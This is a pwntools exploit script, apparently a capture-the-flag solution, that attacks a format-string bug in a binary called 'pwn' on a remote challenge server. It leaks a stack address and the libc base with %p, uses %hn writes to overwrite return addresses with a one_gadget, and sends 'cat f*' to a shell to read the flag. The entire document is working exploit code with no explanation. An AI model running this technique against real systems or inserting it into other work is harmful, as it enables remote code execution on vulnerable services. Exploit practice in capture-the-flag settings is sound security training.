from pwn import *

context(log_level="debug", arch="amd64", os="linux")

io = process(
    ["/home/gets/hznu/fmt/ld.so.2", "./pwn"],
    env={"LD_PRELOAD": "/home/gets/hznu/fmt/libc.so.6"},
)

io = remote("node1.tgctf.woooo.tech",31647)
elf = ELF("./pwn")
libc = ELF("libc.so.6")
io.recvuntil(b"0x")
stack = int(io.recv(12), 16)
info("stack: " + hex(stack))
#gdb.attach(io)
payload = b"%4669c%11$hn" + b"%19$p"
payload = payload.ljust(0x28, b"\x00")
payload += p64(stack - 8)
io.send(payload)
io.recvuntil(b"0x")
libc.address = int(io.recv(12), 16) - 0x24083
info("libc base: " + hex(libc.address))

one = [0xE3AFE, 0xE3B01, 0xE3B04]
one_gadget = libc.address + one[1]
payload = b"%" + str(one_gadget & 0xFFFF).encode()
payload += (
    b"c%10$hn%" + str(((one_gadget >> 16) & 0xFFFF) - (one_gadget & 0xFFFF)).encode()
)
payload += b"c%11$hn"
payload = payload.ljust(0x20, b"\x00")
payload += p64(stack + 0x68)
payload += p64(stack + 0x68 + 2)
#gdb.attach(io)
io.send(payload)
io.sendline(b'cat f*')
io.interactive()
